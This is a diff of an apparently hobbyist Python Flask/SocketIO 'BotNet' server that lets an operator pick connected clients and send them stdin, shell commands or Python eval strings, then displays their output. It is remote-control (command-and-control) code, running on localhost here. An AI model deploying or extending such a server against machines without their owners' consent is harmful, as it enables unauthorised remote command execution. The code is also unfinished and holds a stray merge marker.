@@ -13,13 +13,15 @@ except: import byteutils
 
 ''' Sumner: if you are reading this I have only just got the main concept working,
 Looks pretty dope though so far.
+=======
+See accompanying README for TODOs.
 
  To run: python server.py'''
 
 HOST = 'localhost'
 PORT = 1708
 allConnections = {}
-connected = 'EvanKing' #temp variable for testing
+connected = ''  # temp variable for testing
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
@@ -38,17 +40,23 @@ def index():
     if request.method == 'POST':
         select = request.form.get('bot')
         connected = str(select)
-    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(), connected=connected)
-
+    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(),
+                           connected=connected)
 
 @socketio.on('send_command', namespace='/bot')
 def send_receive(cmd):
-    output = allConnections[connected].send(cmd['data'])
-    output = json.loads(output)['output']
-    if output:
+    raw_output = ''
+    try:
+        raw_output = allConnections[connected].send(cmd['data'])
+    except:
         emit('response',
-             {'data': output[:-1]})
-
+             {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
+    if raw_output:
+        output = json.loads(raw_output)
+        stdout = output['stdout']
+        stderr = output['stderr']
+        emit('response',
+             {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
 
 #TODO: not done
 @app.route("/", methods=['GET', 'POST'])
@@ -71,31 +79,34 @@ class BotNet(Thread):
             print("[+] Recieved connection from {}".format(host_info['user']))
             allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)
 
+            user = host_info['user'][:-1]
+            socketio.emit('connection', {'user': user}, namespace='/bot')
+            allConnections[user] = Bot(clientsock, host_info)
+
             # Testing: automatically sends "say hi" command
-            allConnections[host_info['user'][:-1]].sendStdin('say hi\n')
+            allConnections[user].sendStdin('say hi\n')
 
 
-# TODO: can make this multi-threaded if want to send to multiple clients at once
+# TODO: can make this multi-threaded if want to send to multiple clients at once in the future
 class Bot:
     def __init__(self, sock, host_info):
         self.sock = sock
-        self.arch = host_info['arch']
-        self.user = host_info['user']
+        self.arch = host_info['arch'][:-1]
+        self.user = host_info['user'][:-1]
+
+    def send(self, cmd, type="stdin"):
+        json_str = json.dumps({type:cmd})
+        json_format = byteutils.formatBytes(json_str)
+        self.sock.sendall(json_format)
 
     def sendStdin(self, cmd):
-        json_str = json.dumps(dict(stdin=cmd))
-        json_format = byteutils.formatBytes(json_str)
-        self.sock.sendall(json_format)
+        self.send(cmd,type="stdin")
 
     def sendCmd(self, cmd):
-        json_str = json.dumps(dict(cmd=cmd))
-        json_format = byteutils.formatBytes(json_str)
-        self.sock.sendall(json_format)
+        self.send(cmd, type="cmd")
 
     def sendEval(self, cmd):
-        json_str = json.dumps(dict(eval=cmd))
-        json_format = byteutils.formatBytes(json_str)
-        self.sock.sendall(json_format)
+        self.send(cmd, type="eval")
 
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
